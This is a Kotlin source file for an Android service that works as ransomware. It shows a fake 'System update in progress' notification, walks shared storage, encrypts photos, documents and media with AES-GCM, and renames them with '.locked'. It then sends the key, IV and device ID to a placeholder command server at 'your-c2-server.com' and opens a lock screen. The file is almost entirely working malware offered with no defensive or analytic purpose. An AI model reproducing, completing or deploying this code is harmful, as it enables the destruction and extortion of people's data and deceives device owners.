package com.example.lockapp

import android.app.Notification
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.provider.Settings
import java.io.File
import java.nio.file.Files
import java.nio.file.Paths
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.spec.GCMParameterSpec
import java.security.SecureRandom
import java.util.Base64
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import kotlin.concurrent.thread

class LockService : Service() {
    private val cipher = Cipher.getInstance("AES/GCM/NoPadding")
    private val keyGen = KeyGenerator.getInstance("AES")
    private val key = keyGen.generateKey()
    private val iv = ByteArray(12).also { SecureRandom().nextBytes(it) }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, Notification().apply {
            setSmallIcon(android.R.drawable.ic_dialog_alert)
            contentText = "System update in progress"
        })
        thread {
            encryptAllFiles("/storage/emulated/0")
            sendKeyToC2()
            showLockScreen()
        }
        return START_STICKY
    }

    private fun encryptAllFiles(root: String) {
        Files.walk(Paths.get(root))
            .filter { Files.isRegularFile(it) }
            .filter { it.toString().matches(Regex(".*\\.(jpg|png|pdf|docx|xlsx|txt|mp4|mp3|zip)$")) }
            .forEach { file ->
                val original = Files.readAllBytes(file)
                cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(128, iv))
                val encrypted = cipher.doFinal(original)
                Files.write(file, encrypted)
                Files.move(file, file.resolveSibling(file.fileName.toString() + ".locked"))
            }
    }

    private fun sendKeyToC2() {
        val client = OkHttpClient()
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("key", Base64.getEncoder().encodeToString(key.encoded))
            .addFormDataPart("iv", Base64.getEncoder().encodeToString(iv))
            .addFormDataPart("device_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
            .build()
        val request = Request.Builder()
            .url("https://your-c2-server.com/collect")
            .post(body)
            .build()
        client.newCall(request).execute()
    }

    private fun showLockScreen() {
        val intent = Intent(this, LockActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
        }
        startActivity(intent)
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
